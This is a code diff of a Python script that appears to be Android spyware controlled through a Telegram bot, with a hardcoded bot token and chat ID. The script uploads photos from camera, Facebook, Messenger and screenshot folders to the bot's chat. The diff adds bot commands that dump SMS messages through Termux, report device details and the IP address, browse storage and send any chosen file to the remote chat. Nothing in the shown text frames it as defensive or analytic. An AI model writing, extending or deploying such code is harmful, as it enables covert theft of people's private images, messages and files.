@@ -1,21 +1,24 @@
 import os
 import requests
-import shutil
+import json
+import subprocess
+import threading
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
 
 # Global variables
-target_directory = "/storage/emulated/0/Download/Images/"
+current_folder = "/storage/emulated/0/"
 directories_to_search = [
     "/storage/emulated/0/DCIM/Camera",
     "/storage/emulated/0/DCIM/Facebook",
     "/storage/emulated/0/Pictures/Screenshots",
     "/storage/emulated/0/Pictures/Messenger"
 ]
+stop_download_images = False
 
-# Function to send message to Telegram
+# Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     data = {
@@ -39,32 +42,125 @@ def send_to_telegram(message, document=None):
     except Exception as e:
         print(f"Error sending message: {str(e)}")
 
-# Function to download images from specified directories and send them to Telegram
-def download_and_send_images():
+# Function to get storage file and folder list
+def get_storage_list(folder_path):
     try:
+        file_list = os.listdir(folder_path)
+        if file_list:
+            return file_list
+        else:
+            return "No files or folders found."
+    except Exception as e:
+        return f"Error getting file list: {str(e)}"
+
+# Function to download a specific file
+def download_file(file_name):
+    try:
+        file_path = os.path.join(current_folder, file_name)
+        
+        if os.path.isfile(file_path):
+            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+            files = {'document': open(file_path, 'rb')}
+            data = {"chat_id": CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            
+            if response.status_code == 200:
+                return f"File `{file_name}` sent successfully!"
+            else:
+                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
+        else:
+            return f"File `{file_name}` does not exist or is not a valid file."
+    except Exception as e:
+        return f"Error downloading file: {str(e)}"
+
+# Function to handle folder navigation
+def handle_folder_navigation(folder_name):
+    global current_folder
+    try:
+        new_folder_path = os.path.join(current_folder, folder_name)
+        
+        if os.path.isdir(new_folder_path):
+            current_folder = new_folder_path
+            file_list = get_storage_list(current_folder)
+            if isinstance(file_list, list):
+                file_list_message = f"*Contents of `{current_folder}`:*\n"
+                file_list_message += "\n".join([f"`{file}`" for file in file_list])
+                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
+                send_to_telegram(file_list_message)
+            else:
+                send_to_telegram(file_list)
+        else:
+            send_to_telegram(f"`{folder_name}` is not a valid folder.")
+    except Exception as e:
+        send_to_telegram(f"Error navigating folder: {str(e)}")
+
+# Function to download and send images from specified directories
+def download_and_send_images():
+    global stop_download_images
+    try:
+        sent_files = set()
         for directory in directories_to_search:
             if os.path.isdir(directory):
                 for filename in os.listdir(directory):
+                    if stop_download_images:
+                        send_to_telegram("Image download process stopped.")
+                        return "Image download process stopped."
+                    
                     if filename.lower().endswith(('.png', '.jpg')):
                         src_path = os.path.join(directory, filename)
-                        send_to_telegram(f"Sending image `{filename}`...", document=src_path)
+                        if filename not in sent_files:
+                            send_to_telegram(f"Sending image `{filename}`...", document=src_path)
+                            sent_files.add(filename)
         
         return "All images have been sent to Telegram."
     except Exception as e:
         return f"Error sending images: {str(e)}"
 
+# Function to get SMS messages (using Termux API)
+def get_sms_messages():
+    try:
+        result = subprocess.run(['termux-sms-list'], capture_output=True, text=True)
+        if result.returncode == 0:
+            return result.stdout
+        else:
+            return f"Error retrieving SMS messages: {result.stderr}"
+    except Exception as e:
+        return f"Error retrieving SMS messages: {str(e)}"
+
+# Function to get device information
+def get_device_info():
+    try:
+        device_info = {
+            "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
+            "IP Address": subprocess.run(['ip', 'addr', 'show', 'wlan0'], capture_output=True, text=True).stdout,
+            "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
+        }
+        device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
+        return device_info_str
+    except Exception as e:
+        return f"Error retrieving device info: {str(e)}"
+
 # Function to handle Telegram bot commands
 def handle_telegram_update(update):
+    global stop_download_images
     try:
         message = update.get('message', {}).get('text', '')
         if message:
             if message.startswith('/'):
-                if message == '/download_images':
+                if message == '/sms':
+                    send_to_telegram(get_sms_messages())
+                elif message == '/device':
+                    send_to_telegram(get_device_info())
+                elif message == '/sdcard':
+                    handle_folder_navigation("storage/emulated/0")
+                elif message == '/download_images':
                     send_to_telegram(download_and_send_images())
+                elif message == '/download_images_stop':
+                    stop_download_images = True
+                    send_to_telegram("Image download process has been stopped.")
                 else:
                     send_to_telegram(f"Unknown command `{message}`.")
             else:
-                # Handle folder and file operations
                 folder_path = os.path.join(current_folder, message)
                 if os.path.isdir(folder_path):
                     handle_folder_navigation(message)
